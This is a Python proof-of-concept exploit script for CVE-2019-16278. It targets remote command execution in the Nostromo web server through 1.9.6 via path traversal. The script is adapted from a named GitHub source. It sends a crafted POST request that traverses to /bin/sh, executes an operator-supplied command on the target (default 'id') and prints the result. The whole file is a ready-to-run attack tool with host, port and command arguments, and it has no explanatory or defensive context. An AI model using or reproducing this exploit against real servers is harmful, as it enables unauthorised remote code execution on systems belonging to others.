#!/usr/bin/env python3
# Based on https://github.com/sudohyak/exploit/tree/master/CVE-2019-16278

import socket, argparse, sys

def server_response(sock):
	resp = b''
	while True:
		chunk = sock.recv(4096)
		if len(chunk) == 0:
			break
		resp = resp + chunk
	return resp.decode("utf-8")

def exploit(host, port, cmd):
	sock = socket.socket()
	sock.settimeout(1)
	sock.connect((host, port))
	payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1".format(cmd)
	sock.send(payload.encode())
	resp = server_response(sock)
	print(resp[resp.index('\r\n\r\n')+6:])

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="RCE in Nostromo web server through 1.9.6 due to path traversal.")
	parser.add_argument("-t", "--host", help="IP address of the Nostromo web server")
	parser.add_argument("-p", "--port", help="port number", type=int, default=80)
	parser.add_argument("-c", "--cmd", help="command to execute, default is id", default="id", nargs='?')
	args = parser.parse_args()

	exploit(args.host,args.port,args.cmd)